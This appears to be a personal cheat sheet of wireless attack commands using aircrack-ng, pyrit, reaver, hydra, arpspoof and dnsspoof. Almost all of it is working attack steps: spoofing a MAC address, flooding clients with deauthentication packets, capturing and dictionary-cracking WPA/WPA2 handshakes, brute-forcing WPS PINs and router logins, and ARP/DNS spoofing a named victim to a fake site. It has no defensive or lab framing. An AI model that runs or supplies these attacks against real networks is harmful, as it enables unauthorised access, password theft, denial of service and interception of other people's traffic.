---------- Change MAC Address ----------

# view interfaces
iwconfig
 
# disable card
ifconfig wlan1 down
 
# get a new random MAC address
macchanger --random wlan1
 
# enable card
ifconfig wlan1 up



---------- Enable Monitor Mode ----------

# kill these processes BEFORE putting the card in monitor mode
airmon-ng check kill
 
# enable monitor mode
airmon-ng start wlan1



---------- Disable Monitor Mode ----------

# take card out of monitor mode
airmon-ng stop wlan0mon

# restart network manager
service network-manager start



---------- Find and Sniff Network ----------

# find the network that we want
airodump-ng wlan1mon

# sniff and save packets
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/WPAcapture wlan1mon



---------- Deauth Attack ----------

# find the devices on a network
airodump-ng --bssid <AP MAC> --channel <#> wlan1mon

# send deauth packets
aireplay-ng --deauth 2000 -a <AP MAC> -c <TARGET MAC> wlan1mon



---------- Crack WPA / WPA2 Passphrase ----------

# capture handshake
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/Captures/WPAsample wlan1mon

# loop through passwords
aircrack-ng Desktop/Captures/WPAsample-01.cap -w Desktop/Lists/passwords_top_1000.txt

# decrypt packets
airdecap-ng -e 'HOMEWIFI' -p bacon123 Desktop/Captures/WPAsample-01.cap



---------- Use pyrit for Faster Cracking ----------

pyrit list_cores
pyrit -r <CAPTURE FILE> analyze
pyrit eval
pyrit -i <PASS FILE> import_passwords

#Note: If you want to import more passwords, just use the same command with a different filename

pyrit -e HOMEWIFI create_essid
pyrit eval

# Pyrit has automatically filtered passwords that are not suitable for WPA(2)-PSK and also sorted out duplicates

pyrit batch
pyrit -r <CAPTURE FILE> attack_db

# Delete ESSID from database
pyrit -e HOMEWIFI delete_essid

# Delete passwords
rm -rf .pyrit/blobspace/password/



---------- WPS Pin Recovery ----------

# Can scan and find WPS enabled access points
wash -i wlan1mon

-i = interface
-b = BSSID
-c = channel
-f = fixed (disable channel hopping)
-a = auto detect best advanced options for target AP
-w = mimic Windows 7 registrar
- v = very verbose (-vv for even more)

-K 1 = pixiewps mode enabled

# Reaver is tool used to attack WPS
reaver -i wlan1mon -b <AP MAC> -c 6 -f -a -w -vv -K 1



---------- Crack Router Login ----------

# Make sure card is in monitor mode
airmon-ng check kill
airmon-ng start wlan1

Go to http://192.168.0.1/ (you must be on the network)
Look what type of router they have and Google the default credentials
Most people dont change their default settings

# Tries null and user name for password too
-e ns

# Exit when login is found
-F

# Displays the results in the terminal
-V

# Number of parallel tasks to run
-t 4

hydra http://[192.168.0.1]/login.html -e ns -F -V -t 4 -L <USERNAMES FILE> -P <PASSWORDS FILE>



---------- DNS Spoof (deadly) ----------

rfkill unblock all && airmon-ng check kill && airmon-ng start wlan1

- Install if not already installed

# Lets our computer act as a bridge and forward packets based on MAC rather than IP (like a router)
apt-get install bridge-utils

- Enable IP forwarding

# Lets us determine the path where packets are sent, usually used by routers to decide which network to send data to 
(do this every time)
echo 1 > /proc/sys/net/ipv4/ip_forward


********** Create DNS host file **********

- We will create a fake DNS response
- When the user asks for the IP of "bacon.com", we will give them our IP

Our actual IP = 192.168.0.11

# Desktop/spoofhosts.txt
192.168.0.11 www*
192.168.0.11 bacon.com


********** Make fake website and start server **********

To host file on own computer, create and save index.html to var/www/html/

<!DOCTYPE html>
<html>
<head>
	<title>Title</title>
</head>
<body>
	<h1>Gametime</h1>
</body>
</html> 

# Start apache
apache2ctl start


********** Start ARP and DNS spoofing **********

We will constantly send the victim computer ARP answers telling him that the MAC address belonging to the IP of the router is our MAC address.

- Tell the victim that our IP address is the routers
- Also tell the router that we are the victims IP

Victims IP = 192.168.0.17
Router = 192.168.0.1

# New terminal for each
arpspoof -t 192.168.0.17 192.168.0.1 && arpspoof -t 192.168.0.1 192.168.0.17
dnsspoof -f Desktop/spoofhosts.txt host 192.168.0.17 and udp port 53



